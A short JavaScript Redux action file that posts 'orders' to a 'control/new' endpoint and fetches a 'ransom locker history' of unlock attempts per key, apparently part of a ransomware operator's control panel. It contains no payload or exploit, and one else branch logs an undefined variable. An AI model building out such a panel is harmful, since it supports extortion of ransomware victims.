import { CREATE_ORDER, GET_RANSOM_LOCKER_HISTORY } from "./types";
import connect_control from "../../api/api";

export const create_new_order = (key, order) => async (dispatch) => {
  try {
    const res = await connect_control.post("control/new", {
      key,
      order
    });
    if (res.status == 200) {
      dispatch({
        type: CREATE_ORDER,
      });
    } else {
      console.log(error);
    }
  } catch (error) {
    console.log(error);
  }
};



export const get_ransom_history = (key) => async (dispatch) => {
  try {
    const res = await connect_control.get("control/get-ransom-locker-history?key="+key);
    const {ransom_unlock_history } = res.data
    if (ransom_unlock_history.try_dates.length == 0) {
      dispatch({
        type: GET_RANSOM_LOCKER_HISTORY,
        payload: {
          ransom_history: 0
        }
      });
    } else {
      dispatch({
        type: GET_RANSOM_LOCKER_HISTORY,
        payload: {
          ransom_history: ransom_unlock_history
        }
      });
    }
  } catch (error) {
    console.log(error);
  }
};
